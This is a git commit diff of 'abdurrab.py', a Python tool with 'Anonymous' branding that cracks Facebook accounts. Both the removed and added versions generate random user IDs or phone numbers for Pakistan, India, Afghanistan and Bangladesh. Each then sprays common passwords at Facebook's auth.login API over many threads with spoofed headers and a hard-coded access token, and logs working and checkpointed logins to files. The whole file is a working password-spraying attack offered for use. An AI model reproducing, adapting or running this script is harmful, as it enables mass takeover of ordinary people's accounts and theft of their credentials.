b0a388e37f403497f6a41258848483b376cc0b68
Abd Ur Rab <126180930+abdurrab11@users.noreply.github.com>
2025-03-14 09:35:45 +0500

    abdurrab.py

--- abdurrab.py
+++ abdurrab.py
@@ -1,138 +1,93 @@
-#----------------------------[IMPORT/MODULE]-----------------------------------#
-import requests,bs4,json,os,sys,uuid,random,datetime,time,re
-import urllib3,rich,base64
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import pretty
-from rich.text import Text as tekz
-from time import localtime as lt
-import os,time,random,json,sys,datetime
-try:
-    import requests
-except:
-    os.system("pip3 install requests")
-    import requests 
+#----------------------------[IMPORTS]----------------------------#
+import requests, json, os, sys, time, random, datetime, re, uuid
+import urllib3
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
-#-----------------------------[LINE]-----------------------------------#
-def lin():
-	print("\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-#----------------------------[DATE]-----------------------------------#
-dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
-dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
-tgl = datetime.datetime.now().day
-bln = dic[(str(datetime.datetime.now().month))]
-thn = datetime.datetime.now().year
-okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-date = str(tgl)+'-'+str(bln)
-ltx = int(lt()[3])
-if ltx > 12:
-    a = ltx-12
-    tag = "PM"
-else:
-    a = ltx
-    tag = "AM"
-#----------------------------[COLOR/CODE]-----------------------------------#
-A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
-#----------------------------[USER/AGENT]-----------------------------------#
-def ua():
-    rr=random.randint
-    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    zA=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
-    rx=random.randrange(1, 999)
-    xx=f"Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
-    return xx
-#----------------------------[LOGO]-----------------------------------#
-logo = (f"""        
- WE ARE ANONYMOUS
-   WE ARE LEGION....⚔
-       ___    ____  ____     __  ______     ____  ___    ____
-      /   |  / __ )/ __ \   / / / / __ \   / __ \/   |  / __ )
-     / /| | / __  / / / /  / / / / /_/ /  / /_/ / /| | / __  |
-    / ___ |/ /_/ / /_/ /  / /_/ / _, _/  / _, _/ ___ |/ /_/ /
-   /_/  |_/_____/_____/   \____/_/ |_|  /_/ |_/_/  |_/_____/
+from time import localtime as lt
+from rich import print as rprint
+from rich.panel import Panel
+from rich.console import Console
+import socket
 
+#----------------------------[COLOR SETTINGS]----------------------------#
+console = Console()
+A = '\x1b[1;97m'
+G = '\x1b[38;5;46m'
+R = '\x1b[38;5;196m'
+Y = '\033[1;33m'
+B = '\x1b[38;5;8m'
 
-                WE DO NOT HACK TO IMPRESS
-                   WE HACK TO EXPRESS.....⚔
-  < ━━━━━━━━━━━ [★]ANONYMOUS CYBER[★] ━━━━━━━━━━━━━ >
-\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═
-\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92𝚖ABD UR RAB
-[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92mAbd ur rab
-[\033[1;92m\033[1;34m✔\033[1;92m]TOOL           \033[1;91m\033[1;34m: \033[1;92mOLD ID
-[\033[1;92m\033[1;34m✔\033[1;92m]STATUS         \033[1;91m\033[1;34m: \033[1;92mPaid
-[\033[1;92m\033[1;34m✔\033[1;92m]VERSION        \033[1;91m\033[1;34m: \033[1;35m[\033[1;32m𝚅1\033[1;35m]
-\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═""")
-#----------------------------[MAIN/DEF]-----------------------------------#
-def main():
-    user=[]
+#----------------------------[TOOL INFO]----------------------------#
+def tool_info():
     os.system("clear")
-    print(logo)
-    print(f'\x1b[38;5;8m\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \033[1;37mEXAMPLE   : \033[1;37m10000 | 20000 | 90000')
-    lin()
-    limit=input("\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ")
-    lin()
-    os.system('clear')
-    print(logo)
-    print("\x1b[38;5;8m(\x1b[1;97m1\x1b[38;5;8m) \x1b[1;97mMETHOD ~ (2010-2009")
-    lin()
-    ask=input("\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ")
-    lin()
-    if ask in["1"]:
-        star="10000"
-        for i in range(int(limit)):
-            data=str(random.choice(range(1000000000,1999999999)))
-            user.append(data)
-    else:
-        star="100000"
-        for i in range(int(limit)):
-            data=str(random.choice(range(1000000000,1999999999)))
-            user.append(data)    
-    with ThreadPool(max_workers=40) as MrDevilEx:
-        os.system('clear')
-        print(logo)
-        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mTOTAL ID : {limit} \x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mMETHOD : \x1b[38;5;86m{ask}')
-        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mIF NO RESULT \x1b[38;5;8m[\x1b[38;5;47mON\x1b[1;97m/\x1b[38;5;47mOF\x1b[38;5;8m]  \x1b[38;5;47mAIRPLANE MODE')
-        lin()
-        for mal in user:
-            uid=star+mal
-            MrDevilEx.submit(login,uid)    
-loop=0
-oks=[]
-def login(uid):
-    global oks,loop
-    Session=requests.session()
+    ip = requests.get("https://api64.ipify.org?format=json").json()["ip"]
+    time_now = datetime.datetime.now().strftime("%H:%M:%S")
+    panel_text = f"""
+    [bold green]TOOL OWNER:[/] [cyan]Abd Ur Rab[/]
+    [bold green]STATUS:[/] [cyan]ACTIVE[/]
+    [bold green]VERSION:[/] [cyan]1.0[/]
+    [bold green]TIME:[/] [cyan]{time_now}[/]
+    [bold green]IP ADDRESS:[/] [cyan]{ip}[/]
+    """
+    rprint(Panel(panel_text, title="[bold red]ANONYMOUS TOOL[/]", subtitle="We Are Legion", style="bold magenta"))
+
+#----------------------------[USER AGENT GENERATOR]----------------------------#
+def generate_ua():
+    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(99, 125)}.0.{random.randint(4500, 4999)}.{random.randint(75, 99)} Safari/537.36"
+
+#----------------------------[NUMBER GENERATOR]----------------------------#
+def generate_numbers(country):
+    prefix = {
+        "1": "9230",   # Pakistan
+        "2": "9198",   # India
+        "3": "9370",   # Afghanistan
+        "4": "8801"    # Bangladesh
+    }
+    numbers = []
+    for _ in range(10000):
+        numbers.append(prefix[country] + str(random.randint(1000000, 9999999)))
+    return numbers
+
+#----------------------------[LOGIN FUNCTION]----------------------------#
+def login(uid, pw):
+    session = requests.Session()
     try:
-        sys.stdout.write(f"\r\x1b[38;5;8m(\x1b[1;97m{date}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{loop}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{len(oks)}\x1b[38;5;8m)")
-        sys.stdout.flush()
-        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
-            headers = {
-            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
-            "x-fb-net-hni": str(random.randint(20000, 40000)), 
-            "x-fb-connection-quality": "EXCELLENT",
-            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-            "user-agent": ua(), 
-            "content-type": "application/x-www-form-urlencoded", 
-            "x-fb-http-engine": "Liger"}
-            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
-            if "session_key" in rp:
-                print(f"\r\r{G}SUCCESS {A}➤ {G}{uid} {A}•{G} {pw}")
-                open("/sdcard/MrDevilEx-OLD-OK","a").write(uid+"|"+pw+"\n")
-                oks.append(uid)
-                break 
-            elif "www.facebook.com" in rp["error_msg"]:
-                print(f"\r\r{G}SUCCESS {A}➤ {G}{uid} {A}•{G} {pw}")
-                open("/sdcard/MrDevilEx-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
-                oks.append(uid)
-                break
-            elif "Please Confirm Email" in str(rp):
-                print(f"\r\r{G}SUCCESS {A}➤ {G}{uid} {A}•{G} {pw}")
-                open("/sdcard/ABDUR -OLD-OK.txt","a").write(uid+"|"+pw+"\n")
-                oks.append(uid)
-                break
-            else:continue
-        loop+=1
-    except:pass
-main()
-#----------------------------[CODE/END]-----------------------------------#
+        headers = {
+            "user-agent": generate_ua(),
+            "content-type": "application/x-www-form-urlencoded"
+        }
+        url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+        response = session.get(url, headers=headers).json()
+        
+        if "session_key" in response:
+            rprint(f"[bold green]SUCCESS:[/] {uid} | {pw}")
+            open("success.txt", "a").write(f"{uid}|{pw}\n")
+        elif "www.facebook.com" in response.get("error_msg", ""):
+            rprint(f"[bold yellow]CHECKPOINT:[/] {uid} | {pw}")
+            open("checkpoint.txt", "a").write(f"{uid}|{pw}\n")
+    except Exception as e:
+        pass
+
+#----------------------------[MAIN FUNCTION]----------------------------#
+def main():
+    tool_info()
+    
+    print("\n[1] Pakistan")
+    print("[2] India")
+    print("[3] Afghanistan")
+    print("[4] Bangladesh")
+    country = input("\n[?] Choose Your Country: ")
+    
+    if country not in ["1", "2", "3", "4"]:
+        print("\n[!] Invalid Choice! Exiting...")
+        sys.exit()
+    
+    passwords = ["123456", "12345678", "password", "000000", "pakistan123"]
+    numbers = generate_numbers(country)
+    
+    with ThreadPool(max_workers=30) as executor:
+        for num in numbers:
+            for pw in passwords:
+                executor.submit(login, num, pw)
+
+if __name__ == "__main__":
+    main()
